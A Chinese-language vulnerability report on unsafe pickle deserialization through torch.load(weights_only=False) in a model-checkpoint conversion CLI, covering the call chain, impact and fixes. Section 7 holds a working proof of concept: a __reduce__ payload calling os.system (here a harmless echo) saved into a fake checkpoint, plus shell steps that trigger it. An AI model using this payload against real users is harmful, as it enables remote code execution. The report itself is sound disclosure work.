# VULN-CROSS-002: 不安全反序列化 (Unsafe Deserialization) - main

**严重性**: Critical | **CWE**: CWE-502 | **置信度**: 90/100
**位置**: `checkpoint/convert_cli.py:13-23` @ `main`

---

## 1. 漏洞细节

该漏洞是一个跨模块的不安全反序列化链路，涉及 `checkpoint` 和 `bridge` 两个模块。漏洞的核心在于 `torch.load()` 函数在加载 `.pt` 文件时使用了 `weights_only=False` 参数，这意味着 PyTorch 将使用 Python 的 `pickle` 模块进行反序列化。

**关键问题**：
- `pickle` 模块在反序列化时会执行序列化数据中嵌入的任意 Python 代码
- 攻击者可以通过构造恶意的 `.pt` checkpoint 文件，在文件中嵌入恶意 pickle payload
- 当用户通过 CLI 工具加载该恶意 checkpoint 文件时，恶意代码将被自动执行

**跨模块数据流**：
```
checkpoint/convert_cli.py → ConvertConfig → checkpoint/vlm_model/mm_to_hf.py → torch.load(weights_only=False)
```

## 2. 漏洞代码

### 文件 1: `checkpoint/convert_cli.py` (入口点)

```python
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
@File    : convert_cli.py
@Time    : 2025/01/12
@Desc    : 权重转换命令行入口
"""
import jsonargparse

from checkpoint.common.converter import Commandable


def main():
    import os
    os.environ['JSONARGPARSE_DEPRECATION_WARNINGS'] = 'off'
    # Allow docstring (including field descriptions) to be parsed as the command-line help documentation.
    # When customizing a converter, you need to inherit from Converter and add it to __init__.py.
    jsonargparse.set_parsing_settings(docstring_parse_attribute_docstrings=True)
    jsonargparse.auto_cli(Commandable.subclasses, as_positional=False)


if __name__ == "__main__":
    main()
```

**分析**：`main()` 函数使用 `jsonargparse.auto_cli` 自动解析命令行参数，并将参数传递给 `Commandable.subclasses` 中的转换器类。用户可以通过 CLI 参数 `mm_dir` 或 `source_path` 指定 checkpoint 文件路径。

### 文件 2: `checkpoint/vlm_model/mm_to_hf.py` (漏洞触发点)

```python
def load_from_mm(load_dir: Path,
                 vit_pp_list: PP_LAYER_NUM_T,
                 llm_pp_list: PP_LAYER_NUM_T,
                 tp_size: int = 1,
                 audio_pp_list: PP_LAYER_NUM_T = None,
                 ep_size: int = 1,
                 num_experts: int = 1) -> List[STATE_DICT_T]:
    import mindspeed.megatron_adaptor  # noqa
    save_iteration = load_dir.joinpath(LATEST_TXT).read_text()
    save_dir = load_dir.joinpath(f"iter_{int(save_iteration):07}" if save_iteration != "release" else save_iteration)

    # ... 省略部分代码 ...

    for tp_rank in range(tp_size):
        pp_state_dict = {}
        for pp_rank in range(global_pp_size):
            if ep_size > 1:
                for ep_rank in range(ep_size):
                    if global_pp_size > 1:
                        current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}_{int(ep_rank):03}")
                    else:
                        current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(ep_rank):03}")
                    pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)
                    dict_ep = {}
                    # ⚠️ 漏洞点：weights_only=False 允许执行任意代码
                    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items():
                        if tensor is not None:
                            new_key = rename_pp_ep_parameter(...)
                            dict_ep.update({new_key: tensor})
                    pp_state_dict.update(dict_ep)
            else:
                # ⚠️ 另一处漏洞点
                pp_state_dict.update(
                    {rename_pp_parameter(param, ...): tensor
                    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items()
                    if tensor is None})
```

**分析**：第 92 行和第 107 行的 `torch.load()` 调用都使用了 `weights_only=False`，这是漏洞的直接触发点。`pt_path` 由 `load_dir` 参数构建，该参数最终来自用户通过 CLI 提供的 checkpoint 目录路径。

## 3. 完整攻击链路

```
[入口点] main()@checkpoint/convert_cli.py:13
↓ CLI 参数解析 (mm_dir, source_path)
[中间步骤1] jsonargparse.auto_cli() → ConvertConfig
↓ 参数传递到转换配置
[中间步骤2] ConvertConfig → convert_mm_to_hf()
↓ 调用 load_from_mm()
[中间步骤3] load_from_mm()@checkpoint/vlm_model/mm_to_hf.py:63
↓ 构建 pt_path = load_dir.joinpath(...)
[漏洞触发] torch.load(pt_path, weights_only=False)@mm_to_hf.py:92
↓ pickle 反序列化执行恶意代码
[攻击结果] 任意代码执行 (RCE)
```

**链路验证**：
1. 用户执行 `python checkpoint/convert_cli.py --mm_dir /path/to/checkpoint`
2. CLI 参数被解析并传递给转换器
3. 转换器调用 `load_from_mm(load_dir)`，其中 `load_dir` 来自用户输入
4. `load_from_mm()` 构建 checkpoint 文件路径并调用 `torch.load()`
5. `torch.load(weights_only=False)` 使用 pickle 反序列化，触发恶意 payload

## 4. 攻击场景

**攻击者画像**：远程攻击者，能够提供或诱导用户下载恶意的 checkpoint 文件

**攻击向量**：通过共享恶意 checkpoint 文件（如模型权重文件）进行攻击

**利用难度**：低

### 攻击步骤

1. **准备恶意 checkpoint 文件**：
   - 攻击者构造包含恶意 pickle payload 的 `.pt` 文件
   - 将恶意文件伪装成合法的模型权重文件
   - 通过模型分享平台、邮件、共享存储等方式分发

2. **诱导用户加载**：
   - 用户执行权重转换命令：
     ```bash
     python checkpoint/convert_cli.py --mm_dir /path/to/malicious_checkpoint
     ```
   - 或者用户在处理从外部获取的 checkpoint 时触发漏洞

3. **代码执行**：
   - `torch.load()` 使用 pickle 反序列化恶意 `.pt` 文件
   - 嵌入的恶意 Python 代码自动执行
   - 攻击者获得目标系统的控制权

## 5. 攻击条件

| 条件类型   | 要求                     | 说明                                          |
| ---------- | ------------------------ | --------------------------------------------- |
| 网络可达性 | 不需要                   | 攻击通过本地文件触发，无需网络连接            |
| 认证要求   | 不需要                   | 任何能执行转换脚本的用户都可能成为受害者      |
| 配置依赖   | 默认配置                 | 漏洞存在于默认代码中，无需特殊配置            |
| 环境依赖   | Python + PyTorch 环境    | 需要目标环境安装 PyTorch 和相关依赖           |
| 时序条件   | 用户执行转换脚本         | 需要用户主动执行 checkpoint 转换操作          |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                             |
| -------- | ---- | ---------------------------------------------------------------- |
| 机密性   | 高   | 攻击者可读取系统上的任意文件，包括配置、密钥、源代码等敏感数据    |
| 完整性   | 高   | 攻击者可修改系统文件、植入后门、篡改数据                          |
| 可用性   | 高   | 攻击者可删除文件、破坏系统、导致服务中断                          |

**影响范围**：
- 执行转换脚本的用户权限范围内的所有资源
- 如果以 root/管理员权限运行，则影响整个系统
- 可能导致横向移动到其他系统（窃取凭证后）

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请勿用于非法用途

### 构造恶意 checkpoint 文件

```python
#!/usr/bin/env python3
"""
PoC: 构造包含恶意 pickle payload 的 .pt 文件
仅供安全测试使用
"""
import torch
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # 执行系统命令的 payload
        # 这里使用无害的命令作为示例
        return (os.system, ('echo "VULN-CROSS-002: Malicious code executed!"',))

# 创建包含恶意 payload 的 "模型权重"
malicious_state_dict = {
    'model': {
        'malicious_layer.weight': MaliciousPayload(),
        'normal_layer.weight': torch.randn(10, 10)
    }
}

# 保存为 checkpoint 文件
torch.save(malicious_state_dict, 'malicious_checkpoint.pt')
print("恶意 checkpoint 文件已生成: malicious_checkpoint.pt")
```

### 触发漏洞

```bash
# 1. 创建恶意 checkpoint 目录结构
mkdir -p malicious_checkpoint/release/mp_rank_00
mv malicious_checkpoint.pt malicious_checkpoint/release/mp_rank_00/model_optim_rng.pt
echo "release" > malicious_checkpoint/latest_checkpointed_iteration.txt

# 2. 执行转换命令触发漏洞
python checkpoint/convert_cli.py --mm_dir malicious_checkpoint

# 预期结果：控制台输出 "VULN-CROSS-002: Malicious code executed!"
```

**预期结果**：恶意 payload 被执行，输出证明代码已运行。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / CentOS 7+)
- Python: 3.8+
- PyTorch: 2.0+
- 依赖: 项目所需的其他依赖包

### 构建步骤

```bash
# 克隆项目
git clone <project_url>
cd MindSpeed-MM

# 安装依赖
pip install -r requirements.txt
pip install torch
```

### 运行配置

无需特殊配置，使用默认项目配置即可。

### 验证步骤

1. 使用 PoC 脚本生成恶意 checkpoint 文件
2. 构建正确的 checkpoint 目录结构
3. 执行转换命令：`python checkpoint/convert_cli.py --mm_dir malicious_checkpoint`
4. 观察是否输出恶意 payload 的执行结果

### 预期结果

- 控制台输出恶意 payload 的执行结果（如示例中的 echo 输出）
- 证明 pickle 反序列化过程中代码被执行
- 确认漏洞存在且可被利用

---

## 9. 修复建议

### 紧急修复方案

**方案 1：使用 `weights_only=True`**

```python
# 修改 checkpoint/vlm_model/mm_to_hf.py
# 第 92 行和第 107 行

# 原代码（不安全）：
torch.load(pt_path, map_location='cpu', weights_only=False)['model']

# 修复后（安全）：
torch.load(pt_path, map_location='cpu', weights_only=True)['model']
```

**注意**：`weights_only=True` 仅加载张量数据，不执行任意代码。但可能需要处理旧格式 checkpoint 的兼容性问题。

### 推荐修复方案

**方案 2：添加路径验证和白名单机制**

```python
import os
from pathlib import Path

def validate_checkpoint_path(load_dir: Path):
    """验证 checkpoint 路径是否合法"""
    # 检查路径是否存在
    if not load_dir.exists():
        raise ValueError(f"Checkpoint directory not found: {load_dir}")
    
    # 检查路径是否在允许的目录范围内
    allowed_dirs = ["/opt/models", "/data/checkpoints"]  # 配置允许的目录
    real_path = load_dir.resolve()
    for allowed in allowed_dirs:
        if str(real_path).startswith(allowed):
            return True
    
    raise ValueError(f"Checkpoint path not in allowed directories: {load_dir}")

def load_from_mm(load_dir: Path, ...):
    # 添加路径验证
    validate_checkpoint_path(load_dir)
    
    # 使用 weights_only=True
    state_dict = torch.load(pt_path, map_location='cpu', weights_only=True)
    ...
```

**方案 3：使用 safetensors 格式**

推荐将 checkpoint 文件格式从 `.pt` 转换为 `.safetensors`，该格式仅存储张量数据，不支持执行代码：

```python
from safetensors.torch import load_file

# 使用 safetensors 替代 torch.load
state_dict = load_file(pt_path.replace('.pt', '.safetensors'))
```

### 长期建议

1. **格式迁移**：逐步将所有 checkpoint 文件迁移到 safetensors 格式
2. **输入验证**：对所有外部文件路径进行严格的验证和沙箱化处理
3. **安全审计**：对所有使用 `pickle` 或 `torch.load()` 的代码进行安全审计
4. **用户教育**：在文档中明确警告用户不要加载来源不明的 checkpoint 文件